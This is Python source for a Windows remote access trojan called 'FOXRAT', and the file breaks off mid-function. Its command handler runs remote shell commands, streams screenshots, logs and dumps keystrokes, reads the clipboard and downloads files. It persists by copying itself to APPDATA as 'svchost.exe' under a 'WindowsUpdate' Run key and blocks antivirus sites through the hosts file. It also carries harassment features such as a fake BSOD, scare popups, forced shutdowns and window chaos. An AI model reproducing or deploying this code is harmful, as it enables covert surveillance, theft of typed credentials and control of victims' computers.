import websocket
import json
import time
import threading
import os
import sys
import base64
import io
import subprocess
import platform
import ctypes
import struct
import random
import string
import urllib.request
import tempfile
import winreg
import win32gui
import win32con
import win32api
import win32process
from PIL import ImageGrab
from pynput.keyboard import Listener as KeyListener
from collections import deque

SERVER_HOST = "127.0.0.1"
SERVER_PORT = 3000
ACCOUNT = "admin"

ws = None
client_id = None
g_livemon = False
g_keylog = False
g_keylog_buffer = []
g_livemic = False
g_fuck_stop = False
g_fuck_thread = None

def gen_id():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))

def send_msg(data):
    global ws
    try:
        if ws and ws.connected:
            ws.send(json.dumps(data))
    except:
        pass

def send_cmd_result(output, seq=""):
    send_msg({"type": "cmd_result", "clientId": client_id, "output": str(output), "seq": seq})

def get_system_info():
    import psutil
    username = os.getenv("USERNAME", "unknown")
    hostname = platform.node()
    os_info = f"{platform.system()} {platform.release()}"
    admin = ctypes.windll.shell32.IsUserAnAdmin() != 0

    cpu = "unknown"
    try:
        cpu = platform.processor() or "unknown"
    except:
        pass

    ram = "unknown"
    try:
        ram_gb = psutil.virtual_memory().total / (1024**3)
        ram = f"{ram_gb:.1f} GB"
    except:
        pass

    active_win = "unknown"
    try:
        hwnd = win32gui.GetForegroundWindow()
        active_win = win32gui.GetWindowText(hwnd) or "unknown"
    except:
        pass

    return {
        "username": username,
        "hostname": hostname,
        "os": os_info,
        "admin": "Yes" if admin else "No",
        "cpu": cpu,
        "ram": ram,
        "activeWindow": active_win,
        "buildVersion": "1.0.0-py"
    }

def screenshot(quality=20):
    try:
        img = ImageGrab.grab()
        buf = io.BytesIO()
        img.save(buf, format="JPEG", quality=quality)
        b64 = base64.b64encode(buf.getvalue()).decode()
        return b64, img.width, img.height
    except:
        return None, 0, 0

def exec_command(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        return result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        return "Error: command timed out"
    except Exception as e:
        return f"Error: {e}"

def keylogger_thread():
    global g_keylog_buffer
    def on_press(key):
        if not g_keylog:
            return False
        try:
            k = key.char
        except:
            k = f"[{key.name}]"
        g_keylog_buffer.append(k)
        if len(g_keylog_buffer) > 1000:
            g_keylog_buffer = g_keylog_buffer[-500:]

    with KeyListener(on_press=on_press) as listener:
        listener.join()

def livemon_thread():
    while g_livemon:
        try:
            b64, w, h = screenshot(20)
            if b64:
                send_msg({"type": "screenshot", "clientId": client_id, "data": b64, "w": str(w), "h": str(h)})
        except:
            pass
        time.sleep(0.1)

def handle_command(cmd_str):
    global g_livemon, g_keylog, g_keylog_buffer, g_livemic

    parts = cmd_str.strip().split(" ", 1)
    cmd = parts[0].lower()
    args = parts[1] if len(parts) > 1 else ""

    if cmd == "shell":
        return exec_command(args)

    elif cmd == "sysinfo":
        return json.dumps(get_system_info(), ensure_ascii=False)

    elif cmd == "screenshot":
        b64, w, h = screenshot(30)
        if b64:
            send_msg({"type": "screenshot", "clientId": client_id, "data": b64, "w": str(w), "h": str(h)})
        return "screenshot sent"

    elif cmd == "livemon":
        global g_livemon_thread
        action = args.strip()
        if action == "start" and not g_livemon:
            g_livemon = True
            g_livemon_thread = threading.Thread(target=livemon_thread, daemon=True)
            g_livemon_thread.start()
            return "live monitor started"
        elif action == "stop":
            g_livemon = False
            return "live monitor stopped"

    elif cmd == "keylog":
        global g_keylog_thread
        action = args.strip()
        if action == "start" and not g_keylog:
            g_keylog = True
            g_keylog_buffer = []
            g_keylog_thread = threading.Thread(target=keylogger_thread, daemon=True)
            g_keylog_thread.start()
            return "keylogger started"
        elif action == "stop":
            g_keylog = False
            return "keylogger stopped"
        elif action == "dump":
            keys = "".join(g_keylog_buffer[-200:])
            g_keylog_buffer = g_keylog_buffer[-50:]
            return keys if keys else "no keys logged"

    elif cmd == "msgbox":
        title, text = args.split("|", 1) if "|" in args else ("Message", args)
        ctypes.windll.user32.MessageBoxW(0, text, title, 0x40)
        return "msgbox shown"

    elif cmd == "speak":
        try:
            import pyttsx3
            engine = pyttsx3.init()
            engine.say(args)
            engine.runAndWait()
            return "spoken"
        except:
            return "Error: pyttsx3 not installed"

    elif cmd == "process":
        action = args.split(" ")[0] if args else ""
        if action == "list":
            try:
                result = subprocess.run("tasklist /FO CSV", shell=True, capture_output=True, text=True)
                return result.stdout
            except:
                return "Error: failed to list processes"
        elif action == "kill":
            name = args.split(" ", 1)[1] if len(args.split(" ")) > 1 else ""
            os.system(f"taskkill /F /IM {name}")
            return f"killed {name}"

    elif cmd == "dirlist":
        path = args.strip() or "C:\\"
        try:
            entries = []
            for e in os.listdir(path):
                full = os.path.join(path, e)
                is_dir = os.path.isdir(full)
                size = os.path.getsize(full) if not is_dir else 0
                entries.append(f"{'[DIR]' if is_dir else '[FIL]'} {e} ({size} bytes)")
            return "\n".join(entries) if entries else "empty directory"
        except Exception as ex:
            return f"Error: {ex}"

    elif cmd == "clipboard":
        try:
            import subprocess
            result = subprocess.run("powershell Get-Clipboard", shell=True, capture_output=True, text=True)
            return result.stdout.strip()
        except:
            return "Error: clipboard access failed"

    elif cmd == "download":
        url = args.strip()
        try:
            path = os.path.join(tempfile.gettempdir(), url.split("/")[-1])
            urllib.request.urlretrieve(url, path)
            return f"downloaded to {path}"
        except Exception as ex:
            return f"Error: {ex}"

    elif cmd == "persist":
        try:
            exe_path = sys.executable if getattr(sys, 'frozen', False) else __file__
            appdata = os.getenv("APPDATA")
            target = os.path.join(appdata, "svchost.exe")
            import shutil
            shutil.copy2(exe_path, target)
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, target)
            winreg.CloseKey(key)
            return "persisted"
        except Exception as ex:
            return f"Error: {ex}"

    elif cmd == "uninstall":
        try:
            exe_path = sys.executable if getattr(sys, 'frozen', False) else __file__
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, "WindowsUpdate")
            winreg.CloseKey(key)
        except:
            pass
        os._exit(0)

    elif cmd == "mousepos":
        try:
            x, y = map(int, args.split())
            win32api.SetCursorPos((x, y))
            return f"mouse moved to {x},{y}"
        except:
            return "Error: invalid coordinates"

    elif cmd == "mouseclick":
        try:
            win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN, 0, 0)
            win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP, 0, 0)
            return "clicked"
        except:
            return "Error: click failed"

    elif cmd == "type":
        try:
            import ctypes.wintypes
            text = args
            VK_MAP = {}
            for c in text:
                if c == '\n':
                    win32api.keybd_event(0x0D, 0, 0, 0)
                    win32api.keybd_event(0x0D, 0, win32con.KEYEVENTF_KEYUP, 0)
                elif c == '\b':
                    win32api.keybd_event(0x08, 0, 0, 0)
                    win32api.keybd_event(0x08, 0, win32con.KEYEVENTF_KEYUP, 0)
                elif c == ' ':
                    win32api.keybd_event(0x20, 0, 0, 0)
                    win32api.keybd_event(0x20, 0, win32con.KEYEVENTF_KEYUP, 0)
                else:
                    ctypes.windll.user32.keybd_event(0, 0, 0x0002, 0)
                    for ch in c:
                        k = ord(ch)
                        if 48 <= k <= 57:
                            vk = k
                        elif 65 <= k <= 90:
                            vk = k + 32
                        elif 97 <= k <= 122:
                            vk = k
                        else:
                            vk = k
                        down = 0x80000000 | (vk & 0xFF)
                        ctypes.windll.user32.keybd_event(vk & 0xFF, 0, 0, 0)
                        ctypes.windll.user32.keybd_event(vk & 0xFF, 0, win32con.KEYEVENTF_KEYUP, 0)
                    ctypes.windll.user32.keybd_event(0, 0, 0x0004, 0)
            return f"typed {len(text)} chars"
        except:
            return "Error: type failed"

    elif cmd == "flip":
        try:
            hdc = win32gui.GetDC(0)
            sw = win32api.GetSystemMetrics(0)
            sh = win32api.GetSystemMetrics(1)
            win32gui.StretchBlt(hdc, 0, 0, sw, sh, hdc, sw, 0, -sw, sh, win32con.SRCCOPY)
            win32gui.ReleaseDC(0, hdc)
            return "screen flipped"
        except:
            return "Error: flip failed"

    elif cmd == "invert":
        try:
            hdc = win32gui.GetDC(0)
            sw = win32api.GetSystemMetrics(0)
            sh = win32api.GetSystemMetrics(1)
            win32gui.BitBlt(hdc, 0, 0, sw, sh, hdc, 0, 0, win32con.DSTINVERT)
            win32gui.ReleaseDC(0, hdc)
            return "screen inverted"
        except:
            return "Error: invert failed"

    elif cmd == "blackout":
        action = args.strip() if args else ""
        try:
            hdc = win32gui.GetDC(0)
            sw = win32api.GetSystemMetrics(0)
            sh = win32api.GetSystemMetrics(1)
            if action == "off":
                win32gui.InvalidateRect(0, None, True)
                return "screen restored"
            else:
                br = win32gui.CreateSolidBrush(0)
                win32gui.FillRect(hdc, (0, 0, sw, sh), br)
                win32gui.DeleteObject(br)
                win32gui.ReleaseDC(0, hdc)
                return "screen blacked out"
        except:
            return "Error: blackout failed"

    elif cmd == "restorescreen":
        try:
            win32gui.InvalidateRect(0, None, True)
            return "screen restored"
        except:
            return "Error: restore failed"

    elif cmd == "penis":
        action = args.strip() if args else "on"
        try:
            import ctypes
            SPI_SETCURSORS = 0x0057
            if action == "off":
                ctypes.windll.user32.SystemParametersInfoW(SPI_SETCURSORS, 0, None, 0)
                return "cursor restored"
            else:
                SIZE = 32
                andMask = bytearray(SIZE * (SIZE // 8))
                xorMask = bytearray(SIZE * (SIZE // 8))
                for y in range(SIZE):
                    for x in range(SIZE):
                        byteIdx = y * (SIZE // 8) + x // 8
                        bitIdx = 7 - (x % 8)
                        inShape = False
                        dx = x - SIZE // 2
                        dy = y - SIZE // 2
                        if dy >= -14 and dy <= -6 and abs(dx) <= (14 - abs(dy)) // 2:
                            inShape = True
                        if dy >= -6 and dy <= 6 and abs(dx) <= 3:
                            inShape = True
                        if dy >= 6 and dy <= 14 and abs(dx) <= (14 - abs(dy)) // 2:
                            inShape = True
                        if inShape:
                            xorMask[byteIdx] |= (1 << bitIdx)
                        else:
                            andMask[byteIdx] |= (1 << bitIdx)
                hCursor = ctypes.windll.user32.CreateCursor(
                    None, 0, 0, SIZE, SIZE,
                    bytes(andMask), bytes(xorMask)
                )
                ctypes.windll.user32.SetCursor(hCursor)
                ctypes.windll.user32.SetSystemCursor(hCursor, 32512)
                return "penis cursor ON"
        except Exception as ex:
            return f"Error: {ex}"

    elif cmd == "fuck":
        action = args.strip() if args else "start"
        global g_fuck_thread, g_fuck_stop
        if action == "start":
            g_fuck_stop = False
            def fuck_chaos():
                def safe_start(path):
                    try: os.startfile(path)
                    except: pass
                def safe_play(mp3):
                    try:
                        subprocess.Popen(
                            ['powershell', '-Command',
                             f'(New-Object Media.SoundPlayer).Play(); Add-Type -A System.Windows.Forms; [System.Media.SoundPlayer]::new().Play();'],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    except: pass
                def play_sounds():
                    try:
                        subprocess.Popen(
                            ['cmd', '/c', 'start', '', 'strashnye-zvuki-dyavolskiy-smeh.mp3'],
                            cwd=os.path.dirname(os.path.abspath(__file__)),
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    except: pass
                while not g_fuck_stop:
                    try:
                        try:
                            subprocess.Popen(
                                ['powershell', '-Command',
                                 f'Add-Type -AssemblyName PresentationCore; $p=New-Object System.Windows.Media.MediaPlayer; $p.Open([uri]::new("{os.path.join(os.path.dirname(__file__), "sounds", "strashnye-zvuki-dyavolskiy-smeh.mp3").replace(chr(92),"/")}")); $p.Play(); Start-Sleep 15'],
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                        except: pass
                        for i in range(8):
                            if g_fuck_stop: break
                            safe_start(os.path.expanduser("~"))
                            safe_start("C:\\Windows\\System32")
                            safe_start("C:\\Windows")
                            time.sleep(0.3)
                        for i in range(5):
                            if g_fuck_stop: break
                            try:
                                ctypes.windll.user32.SetWindowPos(
                                    ctypes.windll.user32.GetForegroundWindow(), 0,
                                    random.randint(-80, 80), random.randint(-80, 80), 0, 0, 0x0001)
                            except: pass
                            time.sleep(0.03)
                        try:
                            hwnds = []
                            def cb(hwnd, _):
                                if ctypes.windll.user32.IsWindowVisible(hwnd):
                                    hwnds.append(hwnd)
                                return True
                            ctypes.windll.user32.EnumWindows(cb, 0)
                            for h in hwnds[:20]:
                                if g_fuck_stop: break
                                ctypes.windll.user32.ShowWindow(h, 0)
                        except: pass
                        time.sleep(4)
                        try:
                            ctypes.windll.user32.EnumWindows(cb, 0)
                            for h in hwnds[:20]:
                                if g_fuck_stop: break
                                ctypes.windll.user32.ShowWindow(h, 5)
                        except: pass
                        time.sleep(3)
                    except:
                        pass
            g_fuck_thread = threading.Thread(target=fuck_chaos, daemon=True)
            g_fuck_thread.start()
            return "fuck system started"
        elif action == "stop":
            g_fuck_stop = True
            try:
                subprocess.run(['taskkill', '/f', '/im', 'wmplayer.exe'], capture_output=True)
            except: pass
            return "fuck system stopped"

    elif cmd == "taskbarhide":
        try:
            hwnd = win32gui.FindWindow("Shell_TrayWnd", None)
            win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
            return "taskbar hidden"
        except:
            return "Error: taskbar not found"

    elif cmd == "taskbarshow":
        try:
            hwnd = win32gui.FindWindow("Shell_TrayWnd", None)
            win32gui.ShowWindow(hwnd, win32con.SW_SHOW)
            return "taskbar shown"
        except:
            return "Error: taskbar not found"

    elif cmd == "openurl":
        import webbrowser
        webbrowser.open(args)
        return f"opened {args}"

    elif cmd == "fakeerror":
        ctypes.windll.user32.MessageBoxW(0, args, "Error", 0x10)
        return "fake error shown"

    elif cmd == "wallpaper":
        try:
            import requests
            path = os.path.join(tempfile.gettempdir(), "wallpaper.jpg")
            r = requests.get(args, timeout=10)
            with open(path, "wb") as f:
                f.write(r.content)
            ctypes.windll.user32.SystemParametersInfoW(0x0014, 0, path, 0x01)
            return "wallpaper set"
        except Exception as ex:
            return f"Error: {ex}"

    elif cmd == "chat":
        action = args.split(" ")[0] if args else ""
        if action == "open":
            msg = args.split(" ", 1)[1] if len(args.split(" ")) > 1 else ""
            import tkinter as tk
            from tkinter import messagebox
            def show_chat():
                root = tk.Tk()
                root.title("Message from h@ck3r")
                root.attributes("-topmost", True)
                root.geometry("420x180")
                root.resizable(False, False)
                tk.Label(root, text="h@ck3r:", font=("Segoe UI", 11), anchor="w").pack(padx=10, pady=(10,0), fill="x")
                txt = tk.Text(root, height=5, font=("Segoe UI", 10), wrap="word")
                txt.insert("1.0", msg)
                txt.config(state="disabled")
                txt.pack(padx=10, pady=5, fill="both", expand=True)
                tk.Label(root, text="Only h@ck3r can close this window", font=("Segoe UI", 9), fg="gray").pack(pady=(0,10))
                root.protocol("WM_DELETE_WINDOW", lambda: None)
                root.mainloop()
            threading.Thread(target=show_chat, daemon=True).start()
            return "chat opened"
        elif action == "close":
            try:
                import subprocess
                subprocess.run('powershell -command "Get-Process | Where-Object {$_.MainWindowTitle -eq \'Message from h@ck3r\'} | ForEach-Object { $_.CloseMainWindow() | Out-Null }"', shell=True)
                return "chat close requested"
            except:
                return "Error: close failed"

    elif cmd == "webcam":
        action = args.strip()
        return f"webcam {action} - not implemented in Python build yet"

    elif cmd == "livemic":
        action = args.strip()
        return f"livemic {action} - not implemented in Python build yet"

    elif cmd == "blockav":
        try:
            hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
            av_sites = [
                "127.0.0.1 www.virustotal.com",
                "127.0.0.1 www.avast.com",
                "127.0.0.1 www.avg.com",
                "127.0.0.1 www.malwarebytes.com",
                "127.0.0.1 update.symantec.com"
            ]
            with open(hosts_path, "a") as f:
                f.write("\n" + "\n".join(av_sites))
            return "AV sites blocked"
        except Exception as ex:
            return f"Error: {ex}"

    elif cmd == "prockill":
        name = args.strip()
        os.system(f"taskkill /F /IM {name}")
        return f"killed {name}"

    elif cmd == "procstart":
        name = args.strip()
        os.startfile(name)
        return f"started {name}"

    elif cmd == "idle":
        try:
            class LASTINPUTINFO(ctypes.Structure):
                _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_uint)]
            lii = LASTINPUTINFO()
            lii.cbSize = ctypes.sizeof(LASTINPUTINFO)
            ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii))
            idle_ms = ctypes.windll.kernel32.GetTickCount() - lii.dwTime
            mins = idle_ms // 60000
            secs = (idle_ms // 1000) % 60
            return f"Idle: {mins} min {secs} sec"
        except:
            return "Error: idle query failed"

    elif cmd == "bsod":
        try:
            import ctypes.wintypes
            user32 = ctypes.windll.user32
            hdc = user32.GetDC(0)
            sw, sh = ctypes.windll.user32.GetSystemMetrics(0), ctypes.windll.user32.GetSystemMetrics(1)
            hBrush = ctypes.windll.gdi32.CreateSolidBrush(0x00AA0000)
            ctypes.windll.user32.FillRect(hdc, ctypes.byref(ctypes.wintypes.RECT(0, 0, sw, sh)), hBrush)
            ctypes.windll.gdi32.DeleteObject(hBrush)
            ctypes.windll.gdi32.SetBkColor(hdc, 0x00AA0000)
            ctypes.windll.gdi32.SetTextColor(hdc, 0x00FFFFFF)
            hFont = ctypes.windll.gdi32.CreateFontW(24, 0, 0, 0, 400, 0, 0, 0, 0, 0, 0, 0, 0, "Consolas")
            old = ctypes.windll.gdi32.SelectObject(hdc, hFont)
            ctypes.windll.user32.TextOutW(hdc, 100, 100, ":( Your PC ran into a problem and needs to restart.", 51)
            ctypes.windll.user32.TextOutW(hdc, 100, 150, "Stop code: FOXRAT_FATAL_ERROR", 30)
            ctypes.windll.user32.TextOutW(hdc, 100, 200, "What failed: msscr.sys", 22)
            ctypes.windll.user32.TextOutW(hdc, 100, 280, "Collecting error info... 100%", 28)
            ctypes.windll.gdi32.SelectObject(hdc, old)
            ctypes.windll.gdi32.DeleteObject(hFont)
            ctypes.windll.user32.ReleaseDC(0, hdc)
            return "bsod displayed"
        except:
            return "Error: bsod failed"

    elif cmd == "virus":
        try:
            for i in range(10):
                def cb(msg=i):
                    import tkinter as tk
                    from tkinter import messagebox
                    root = tk.Tk()
                    root.withdraw()
                    root.attributes('-topmost', True)
                    msgs = ["VIRUS DETECTED!", "YOUR PC IS INFECTED!", "DATA STEALING IN PROGRESS...", "CALL MICROSOFT: +1-800-FAKE", "DO NOT SHUT DOWN!", "ENCRYPTING FILES...", "SENDING PASSWORDS...", "ACCESS GRANTED TO HACKER"]
                    messagebox.showerror("CRITICAL ERROR", random.choice(msgs))
                    root.destroy()
                threading.Thread(target=cb, daemon=True).start()
            return "virus popups sent"
        except:
            return "Error: virus failed"

    elif cmd == "shutdown":
        try:
            args_val = args.strip() if args else "30"
            os.system(f"shutdown /s /t {args_val} /c \"System has encountered a critical error\"")
            return f"shutdown scheduled in {args_val}s"
        except:
            return "Error: shutdown failed"

    elif cmd == "abortshutdown":
        try:
            os.system("shutdown /a")
            return "shutdown aborted"
        except:
            return "Error: abort failed"

    elif cmd == "eject":
        try:
            os.system("powershell -Command \"$eject = New-Object -ComObject Shell.Application; $eject.NameSpace(17).InvokeVerb('Eject')\"")
            return "cd eject sent"
        except:
            return "Error: eject failed"

    elif cmd == "keyboard":
        try:
            import ctypes.wintypes
            for _ in range(20):
                for vk in [0x14, 0x90, 0x91]:
                    ctypes.windll.user32.keybd_event(vk, 0, 0, 0)
                    ctypes.windll.user32.keybd_event(vk, 0, 2, 0)
                time.sleep(0.1)
            return "keyboard lights spammed"
        except:
            return "Error: keyboard failed"

    elif cmd == "volume":
        try:
            import ctypes.wintypes
            for _ in range(30):
                ctypes.windll.user32.keybd_event(0xAF, 0, 0, 0)
                ctypes.windll.user32.keybd_event(0xAF, 0, 2, 0)
                time.sleep(0.05)
            return "volume maxed"
        except:
            return "Error: volume failed"

    elif cmd == "volumemute":
        try:
            import ctypes.wintypes
            ctypes.windll.user32.keybd_event(0xAD, 0, 0, 0)
            ctypes.windll.user32.keybd_event(0xAD, 0, 2, 0)
            return "volume toggled mute"
        except:
            return "Error: mute failed"

    elif cmd == "spider":
        try:
            import ctypes.wintypes
            def spider_walk():
                try:
                    for step in range(30):
                        for x in range(0, 1920, 40):
                            ctypes.windll.user32.SetCursorPos(x + random.randint(-5,5), int(step * 30 + random.randint(-5,5)))
                            time.sleep(0.02)
                        for x in range(1920, 0, -40):
                            ctypes.windll.user32.SetCursorPos(x + random.randint(-5,5), int(step * 30 + random.randint(-5,5)))
                            time.sleep(0.02)
                except: pass
            threading.Thread(target=spider_walk, daemon=True).start()
            return "spider cursor started"
        except:
            return "Error: spider failed"

    elif cmd == "cursorhide":
        try:
            ctypes.windll.user32.ShowCursor(False)
            return "cursor hidden"
        except:
            return "Error: cursor hide failed"

    elif cmd == "cursorshow":
        try:
            ctypes.windll.user32.ShowCursor(True)
            return "cursor shown"
        except:
            return "Error: cursor show failed"

    elif cmd == "wobble":
        try:
            import ctypes.wintypes
            def wobble():
                try:
                    for i in range(200):
                        x = int(960 + 30 * ctypes.windll.user32.sin(i * 0.3))
                        y = int(540 + 20 * ctypes.windll.user32.cos(i * 0.5))
                        ctypes.windll.user32.SetCursorPos(x, y)
                        time.sleep(0.02)
                except: pass
            threading.Thread(target=wobble, daemon=True).start()
            return "wobble started"
        except:
            return "Error: wobble failed"

    elif cmd == "jiggle":
        try:
            import ctypes.wintypes
            for _ in range(50):
                ctypes.windll.user32.mouse_event(0x0001, random.randint(-20,20), random.randint(-20,20), 0, 0)
                time.sleep(0.02)
            return "mouse jiggled"
        except:
            return "Error: jiggle failed"

    elif cmd == "circle":
        try:
            import ctypes.wintypes
            def circle():
                try:
                    for i in range(360):
                        x = int(960 + 200 * ctypes.windll.user32.sin(i * 0.05))
                        y = int(540 + 200 * ctypes.windll.user32.cos(i * 0.05))
                        ctypes.windll.user32.SetCursorPos(x, y)
                        time.sleep(0.01)
                except: pass
            threading.Thread(target=circle, daemon=True).start()
            return "cursor circling"
        except:
            return "Error: circle failed"

    elif cmd == "glitch":
        try:
            hdc = win32gui.GetDC(0)
            sw = win32api.GetSystemMetrics(0)
            sh = win32api.GetSystemMetrics(1)
            for _ in range(10):
                sx, sy = random.randint(0, sw-200), random.randint(0, sh-100)
                sw2, sh2 = random.randint(50, 200), random.randint(20, 100)
                dx, dy = random.randint(-50, 50), random.randint(-50, 50)
                try:
                    win32gui.StretchBlt(hdc, dx, dy, sw2, sh2, hdc, sx, sy, sw2, sh2, win32con.SRCCOPY)
                except: pass
            win32gui.ReleaseDC(0, hdc)
            return "screen glitched"
        except:
            return "Error: glitch failed"

    elif cmd == "scanlines":
        try:
            hdc = win32gui.GetDC(0)
            sw = win32api.GetSystemMetrics(0)
            sh = win32api.GetSystemMetrics(1)
            hPen = win32gui.CreatePen(win32con.PS_SOLID, 1, 0x00000000)
            old = win32gui.SelectObject(hdc, hPen)
            for y in range(0, sh, 2):
                win32gui.MoveToEx(hdc, 0, y)
                win32gui.LineTo(hdc, sw, y)
            win32gui.SelectObject(hdc, old)
            win32gui.DeleteObject(hPen)
            win32gui.ReleaseDC(0, hdc)
            return "scanlines applied"
        except:
            return "Error: scanlines failed"

    elif cmd == "thermal":
        try:
            hdc = win32gui.GetDC(0)
            sw = win32api.GetSystemMetrics(0)
            sh = win32api.GetSystemMetrics(1)
            win32gui.BitBlt(hdc, 0, 0, sw, sh, hdc, 0, 0, win32con.SRCCOPY)
            hBrush = ctypes.windll.gdi32.CreateSolidBrush(0x0000AAFF)
            ctypes.windll.user32.FillRect(hdc, ctypes.byref(ctypes.wintypes.RECT(0, 0, sw, sh)), hBrush)
            ctypes.windll.gdi32.DeleteObject(hBrush)
            win32gui.ReleaseDC(0, hdc)
            return "thermal filter"
        except:
            return "Error: thermal failed"

    elif cmd == "nightvision":
        try:
            hdc = win32gui.GetDC(0)
            sw = win32api.GetSystemMetrics(0)
            sh = win32api.GetSystemMetrics(1)
            hBrush = ctypes.windll.gdi32.CreateSolidBrush(0x0000AA00)
            ctypes.windll.user32.FillRect(hdc, ctypes.byref(ctypes.wintypes.RECT(0, 0, sw, sh)), hBrush)
            ctypes.windll.gdi32.DeleteObject(hBrush)
            win32gui.ReleaseDC(0, hdc)
            return "night vision on"
        except:
            return "Error: nightvision failed"

    elif cmd == "shrink":
        try:
            hwnds = []
            def cb(hwnd, _):
                if ctypes.windll.user32.IsWindowVisible(hwnd):
                    hwnds.append(hwnd)
                return True
            ctypes.windll.user32.EnumWindows(cb, 0)
            for h in hwnds:
                try:
                    ctypes.windll.user32.SetWindowPos(h, 0, 0, 0, 100, 80, 0x0001)
                except: pass
            return f"shrunk {len(hwnds)} windows"
        except:
            return "Error: shrink failed"

    elif cmd == "maxall":
        try:
            hwnds = []
            def cb(hwnd, _):
                if ctypes.windll.user32.IsWindowVisible(hwnd):
                    hwnds.append(hwnd)
                return True
            ctypes.windll.user32.EnumWindows(cb, 0)
            for h in hwnds:
                try:
                    ctypes.windll.user32.ShowWindow(h, 3)
                except: pass
            return f"maximized {len(hwnds)} windows"
        except:
            return "Error: maxall failed"

    elif cmd == "cascade":
        try:
            hwnds = []
            def cb(hwnd, _):
                if ctypes.windll.user32.IsWindowVisible(hwnd):
                    hwnds.append(hwnd)
                return True
            ctypes.windll.user32.EnumWindows(cb, 0)
            for i, h in enumerate(hwnds[:15]):
                try:
                    ctypes.windll.user32.SetWindowPos(h, 0, i*30, i*30, 400, 300, 0x0001)
                except: pass
            return f"cascaded {min(len(hwnds),15)} windows"
        except:
            return "Error: cascade failed"

    elif cmd == "tile":
        try:
            hwnds = []
            def cb(hwnd, _):
                if ctypes.windll.user32.IsWindowVisible(hwnd):
                    hwnds.append(hwnd)
                return True
            ctypes.windll.user32.EnumWindows(cb, 0)
            sw = win32api.GetSystemMetrics(0)
            sh = win32api.GetSystemMetrics(1)
            cols = max(1, int(len(hwnds) ** 0.5) + 1)
            ww, wh = sw // cols, sh // (len(hwnds) // cols + 1)
            for i, h in enumerate(hwnds[:20]):
                try:
                    r, c = i // cols, i % cols
                    ctypes.windll.user32.SetWindowPos(h, 0, c*ww, r*wh, ww, wh, 0x0001)
                except: pass
            return f"tiled {min(len(hwnds),20)} windows"
        except:
            return "Error: tile failed"

    elif cmd == "alwaystop":
        try:
            hwnds = []
            def cb(hwnd, _):
                if ctypes.windll.user32.IsWindowVisible(hwnd):
                    hwnds.append(hwnd)
                return True
            ctypes.windll.user32.EnumWindows(cb, 0)
            HWND_TOPMOST = -1
            for h in hwnds:
                try:
                    ctypes.windll.user32.SetWindowPos(h, HWND_TOPMOST, 0, 0, 0, 0, 0x0001 | 0x0002)
                except: pass
            return f"{len(hwnds)} windows always on top"
        except:
            return "Error: alwaystop failed"

    elif cmd == "notop":
        try:
            hwnds = []
            def cb(hwnd, _):
                if ctypes.windll.user32.IsWindowVisible(hwnd):
                    hwnds.append(hwnd)
                return True
            ctypes.windll.user32.EnumWindows(cb, 0)
            HWND_NOTOPMOST = -2
            for h in hwnds:
                try:
                    ctypes.windll.user32.SetWindowPos(h, HWND_NOTOPMOST, 0, 0, 0, 0, 0x0001 | 0x0002)
                except: pass
            return f"{len(hwnds)} windows un-pinned"
        except:
            return "Error: notop failed"

    elif cmd == "fullscreen":
        try:
            hwnd = ctypes.windll.user32.GetForegroundWindow()
            sw = win32api.GetSystemMetrics(0)
            sh = win32api.GetSystemMetrics(1)
            ctypes.windll.user32.SetWindowPos(hwnd, -1, 0, 0, sw, sh, 0x0001)
            return "foreground window fullscreened"
        except:
            return "Error: fullscreen failed"

    elif cmd == "title":
        try:
            import ctypes.wintypes
            new_title = args.strip() if args else "HACKED BY FOXRAT"
            hwnd = ctypes.windll.user32.GetForegroundWindow()
            ctypes.windll.user32.SetWindowTextW(hwnd, new_title)
            return f"title changed to: {new_title}"
        except:
            return "Error: title failed"

    elif cmd == "transparency":
        try:
            import ctypes.wintypes
            val = int(args.strip()) if args else 100
            hwnd = ctypes.windll.user32.GetForegroundWindow()
            GWL_EXSTYLE = -20
            WS_EX_LAYERED = 0x80000
            ctypes.windll.user32.SetWindowLongW(hwnd, GWL_EXSTYLE,
                ctypes.windll.user32.GetWindowLongW(hwnd, GWL_EXSTYLE) | WS_EX_LAYERED)
            ctypes.windll.user32.SetLayeredWindowAttributes(hwnd, 0, val, 2)
            return f"window transparency: {val}"
        except:
            return "Error: transparency failed"

    elif cmd == "shake":
        try:
            import ctypes.wintypes
            def shake():
                try:
                    hwnd = ctypes.windll.user32.GetForegroundWindow()
                    orig = ctypes.wintypes.RECT()
                    ctypes.windll.user32.GetWindowRect(hwnd, ctypes.byref(orig))
                    for i in range(30):
                        x = orig.left + random.randint(-15, 15)
                        y = orig.top + random.randint(-15, 15)
                        ctypes.windll.user32.SetWindowPos(hwnd, 0, x, y, 0, 0, 0x0001)
                        time.sleep(0.02)
                    ctypes.windll.user32.SetWindowPos(hwnd, 0, orig.left, orig.top, 0, 0, 0x0001)
                except: pass
            threading.Thread(target=shake, daemon=True).start()
            return "window shaking"
        except:
            return "Error: shake failed"

    elif cmd == "rotate":
        try:
            hdc = win32gui.GetDC(0)
            sw = win32api.GetSystemMetrics(0)
            sh = win32api.GetSystemMetrics(1)
            win32gui.StretchBlt(hdc, sw, 0, -sw, sh, hdc, 0, 0, sw, sh, win32con.SRCCOPY)
            win32gui.StretchBlt(hdc, 0, sh, sw, -sh, hdc, 0, 0, sw, sh, win32con.SRCCOPY)
            win32gui.ReleaseDC(0, hdc)
            return "screen rotated 180"
        except:
            return "Error: rotate failed"

    elif cmd == "echo":
        try:
            import winsound as wsound
            for _ in range(5):
                os.system("powershell -Command \"[Console]::Beep(800,200)\"")
            return "echo sound played"
        except:
            return "Error: echo failed"

    elif cmd == "elevator":
        try:
